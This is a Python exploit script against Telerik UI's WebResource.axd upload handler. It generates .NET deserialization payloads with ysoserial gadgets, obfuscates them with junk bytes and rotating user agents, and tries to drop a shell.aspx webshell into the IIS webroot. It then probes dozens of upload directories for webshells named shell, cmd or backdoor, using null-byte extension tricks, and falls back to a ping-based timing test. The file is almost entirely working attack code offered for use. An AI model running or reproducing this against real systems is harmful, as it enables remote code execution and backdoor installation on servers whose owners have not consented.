#!/usr/bin/env python3
import os
import time
import requests
import urllib3
import urllib.parse
import base64
import subprocess
import random
import string

# \U0001f534 Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# \U0001f534 Prompt for exploit URL
TARGET_URL = input(
    "Enter the full exploit URL\n"
    "(e.g. https://example.com/Telerik.Web.UI.WebResource.axd?type=rau): "
).strip()
parsed = urllib.parse.urlparse(TARGET_URL)
BASE_URL = f"{parsed.scheme}://{parsed.netloc}"

# \U0001f534 Proxy for Burp Suite (None to disable)
PROXY = None  # or {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# \U0001f50d Base upload directories
dirs = [
    "/uploads/", "/Upload/", "/UserFiles/", "/documents/", "/docs/", "/media/", "/files/",
    "/FileUploads/", "/Temp/", "/TempUploads/", "/bundles/", "/Scripts/", "/script/",
    "/app/", "/content/", "/Content/Uploads/", "/downloads/", "/downloads/files/",
    "/images/", "/images/uploads/", "/report/", "/remote/", "/errorPages/", "/documentation/",
    "/docs/uploads/", "/asp_client/", "/TelerikUpload/", "/assets/", "/public/",
    "/public_html/uploads/", "/storage/", "/data/", "/App_Data/", "/App_Data/Uploads/",
    "/FileStore/", "/packages/", "/AppFiles/", "/tmp/", "/var/www/uploads/",
    "/web/uploads/", "/php/uploads/", "/uploadify/", "/siteassets/", "/content/uploads/",
    "/RadUpload/", "/Telerik/Uploads/", "/FileHandler.axd/Upload/", "/CMS/Uploads/"
]
# \U0001f534 Extra upload paths
extra = input("Optionally add extra upload paths (comma-separated), or press Enter to skip: ").strip()
if extra:
    for p in extra.split(","):
        p = p.strip()
        if p and not p.endswith("/"):
            p += "/"
        if p and p not in dirs:
            dirs.append(p)
UPLOAD_DIRS = dirs

# \U0001f6e0\ufe0f Shell filenames & true .aspx extensions only
SHELL_NAMES = ["shell.aspx", "cmd.aspx", "backdoor.aspx", "webshell.aspx"]
EXEC_EXTENSIONS = ["", "%00.aspx", ".aspx%2Easp"]

# \U0001f3ad Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0)"
]

# \U0001f527 Path to ysoserial.exe
YSOSERIAL_PATH = os.path.join(os.path.dirname(__file__), "ysoserial.exe")

# \U0001f9f0 Mono-friendly gadgets
GADGETS = ["TypeConfuseDelegateMono", "ClaimsPrincipal", "WindowsIdentity"]

def generate_payload(gadget: str, cmd_str: str) -> str:
    cmd = [
        "mono", YSOSERIAL_PATH,
        "-g", gadget,
        "-f", "BinaryFormatter",
        "-o", "base64",
        "-c", cmd_str
    ]
    try:
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return r.stdout.decode().strip()
    except subprocess.CalledProcessError:
        return None

def encode_payload(blob: str) -> str:
    b64 = base64.b64encode(blob.encode()).decode()
    urlenc = requests.utils.quote(b64)
    junk = "".join(random.choices(string.ascii_letters, k=16))
    return urlenc + junk

def send_payload(payload: str, measure: bool=False) -> tuple:
    data = encode_payload(payload)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/octet-stream"
    }
    kwargs = {
        "url": TARGET_URL,
        "data": data,
        "headers": headers,
        "verify": False
    }
    if PROXY:
        kwargs["proxies"] = PROXY
    start = time.time() if measure else None
    try:
        r = requests.post(**kwargs)
    except requests.exceptions.RequestException:
        return None, 0
    elapsed = (time.time() - start) if measure else 0
    return r, elapsed

def scan_for_shell() -> bool:
    print("[*] Scanning for a live webshell\u2026")
    for d in UPLOAD_DIRS:
        for name in SHELL_NAMES:
            for ext in EXEC_EXTENSIONS:
                url = f"{BASE_URL}{d}{name}{ext}?cmd=whoami"
                r = requests.get(
                    url,
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    verify=False,
                    allow_redirects=False,
                    proxies=PROXY or None
                )
                if r.status_code == 200 and "Oops" not in r.text:
                    print(f"[\U0001f525] Webshell valid at {url}")
                    return True
    return False

def test_delay() -> bool:
    print("[*] Running delay-based vulnerability test\u2026")
    delay_cmd = r"ping 127.0.0.1 -n 6"
    threshold = 4.0
    for g in GADGETS:
        print(f"[*] Testing delay payload with {g}\u2026")
        payload = generate_payload(g, delay_cmd)
        if not payload:
            print(f"[-] {g}: payload generation failed")
            continue
        r, elapsed = send_payload(payload, measure=True)
        if r and elapsed > threshold:
            print(f"[\u2705] {g} triggered delay ({elapsed:.1f}s > {threshold}s)")
            return True
        print(f"[-] {g} no significant delay ({elapsed:.1f}s)")
    print("[-] Delay test did not trigger")
    return False

def main():
    print("[*] Attempting webshell upload\u2026")
    shell_cmd = r"echo 'webshell' > C:\\inetpub\\wwwroot\\uploads\\shell.aspx"
    for g in GADGETS:
        print(f"[*] Gadget: {g}")
        payload = generate_payload(g, shell_cmd)
        if not payload:
            print(f"[-] {g}: payload generation failed")
            continue
        r, _ = send_payload(payload)
        if r:
            print("[*] Exploit sent; scanning\u2026")
            if scan_for_shell():
                print(f"[\u2705] Shell deployed with {g}!")
                return
    print("[!] No shell detected; falling back to delay test\u2026")
    if test_delay():
        print("[\u2705] Delay-based test indicates vulnerability")
    else:
        print("[\u274c] No evidence of vulnerability; moving on")

if __name__ == "__main__":
    main()
